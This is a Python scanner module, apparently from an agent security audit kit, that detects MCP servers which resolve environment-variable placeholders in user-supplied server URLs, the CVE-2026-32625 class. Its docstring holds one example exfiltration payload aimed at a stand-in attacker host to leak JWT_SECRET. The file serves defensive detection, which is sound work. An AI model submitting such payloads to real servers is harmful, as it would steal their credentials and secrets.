"""MCP env-placeholder secret-exfiltration scanner — CVE-2026-32625 class.

Flags an MCP server that resolves ``${VAR}`` / ``$VAR`` placeholders against
its own process environment while handling a user-supplied server config
(typically the URL). An authenticated user can then submit
``https://attacker.example/?k=${JWT_SECRET}`` and the server interpolates its
own secrets into the outbound request.

CVE-2026-32625: LibreChat <= 0.8.3 resolved ``${VAR}`` against ``process.env``
during Zod validation of user-supplied MCP server URLs, leaking ``CREDS_KEY``,
``JWT_SECRET``, ``MONGO_URI`` (CWE-200, CVSS 9.6).

Detection signatures (gated to MCP-context files, low false-positive):
  - TS/JS: a ``.replace(/...${...}.../, ... )`` whose replacer reads
    ``process.env`` (placeholder-resolver against the environment).
  - Python: ``os.path.expandvars(<value>)`` (expands ``$VAR``/``${VAR}``
    against ``os.environ``), or ``.format(**os.environ)`` /
    ``.format_map(os.environ)``.
"""

from __future__ import annotations

import re
from pathlib import Path

from agent_audit_kit.models import Finding
from agent_audit_kit.scanners._helpers import find_line_number, make_finding, SKIP_DIRS

_RULE_ID = "AAK-MCP-ENV-PLACEHOLDER-EXFIL-001"

# File must look like it handles MCP server config / URLs.
_MCP_CTX_RE = re.compile(
    r"\bmcp\b|modelcontextprotocol|McpServer|StdioServerParameters|"
    r"mcpServers|server[_-]?url|serverUrl",
    re.IGNORECASE,
)

# TS/JS comment stripping (a comment mentioning process.env must not match).
_TS_BLOCK_COMMENT_RE = re.compile(r"/\*.*?\*/", re.DOTALL)
_TS_LINE_COMMENT_RE = re.compile(r"//[^\n]*")

# TS: a `.replace(` whose first arg is a regex/string carrying a ${...}
# placeholder, followed (same call) by a replacer that reads process.env.
# Tolerant of escaping (\$\{ in a regex literal) and whitespace/newlines.
_TS_ENV_PLACEHOLDER_RE = re.compile(
    r"\.replace\s*\(\s*"          # .replace(
    r"[^;]*?\\?\$\\?\{"           # first arg carries a ${ placeholder
    r"[^;]{0,200}?"               # ...up to the replacer (escaping-tolerant)
    r"process\.env",              # ...which reads process.env
    re.DOTALL,
)

# Python: expandvars expands $VAR/${VAR} against os.environ.
_PY_EXPANDVARS_RE = re.compile(r"\bos\.path\.expandvars\s*\(")
# Python: format/format_map spreading the whole environment into a template.
_PY_FORMAT_ENV_RE = re.compile(
    r"\.format(?:_map)?\s*\(\s*(?:\*\*\s*os\.environ\b|os\.environ\s*\))"
)


def _strip_ts_comments(text: str) -> str:
    text = _TS_BLOCK_COMMENT_RE.sub(" ", text)
    text = _TS_LINE_COMMENT_RE.sub(" ", text)
    return text


def _ts_hit(text: str) -> bool:
    return bool(_TS_ENV_PLACEHOLDER_RE.search(_strip_ts_comments(text)))


def _py_hit(text: str) -> bool:
    return bool(_PY_EXPANDVARS_RE.search(text) or _PY_FORMAT_ENV_RE.search(text))


_PY_SUFFIXES = (".py",)
_TS_SUFFIXES = (".ts", ".tsx", ".js", ".mjs", ".cjs")


def scan(project_root: Path) -> tuple[list[Finding], set[str]]:
    """Scan for MCP env-placeholder secret exfiltration (CVE-2026-32625 class).

    Args:
        project_root: The root directory of the project to scan.

    Returns:
        A tuple of (list of findings, set of scanned file relative paths).
    """
    findings: list[Finding] = []
    scanned_files: set[str] = set()

    for path in project_root.rglob("*"):
        if path.suffix not in _PY_SUFFIXES + _TS_SUFFIXES:
            continue
        try:
            rel_parts = path.relative_to(project_root).parts
        except ValueError:
            continue
        if any(part in SKIP_DIRS for part in rel_parts):
            continue
        if not path.is_file():
            continue
        try:
            if path.stat().st_size > 1_000_000:
                continue
            text = path.read_text(encoding="utf-8", errors="ignore")
        except OSError:
            continue

        if not _MCP_CTX_RE.search(text):
            continue

        if path.suffix in _PY_SUFFIXES:
            hit = _py_hit(text)
            marker = "os.path.expandvars" if "expandvars" in text else "os.environ"
        else:
            hit = _ts_hit(text)
            marker = "process.env"
        if not hit:
            continue

        rel_path = str(path.relative_to(project_root))
        scanned_files.add(rel_path)
        findings.append(make_finding(
            _RULE_ID,
            rel_path,
            (
                f"MCP server resolves ${{VAR}} placeholders against the "
                f"process environment ({marker}) while handling a "
                f"user-supplied server config — a user-supplied URL with "
                f"${{SECRET}} exfiltrates the server's own secrets "
                f"(CVE-2026-32625, CWE-200). Do not expand env placeholders "
                f"found inside untrusted config values."
            ),
            find_line_number(text, marker),
        ))

    return findings, scanned_files
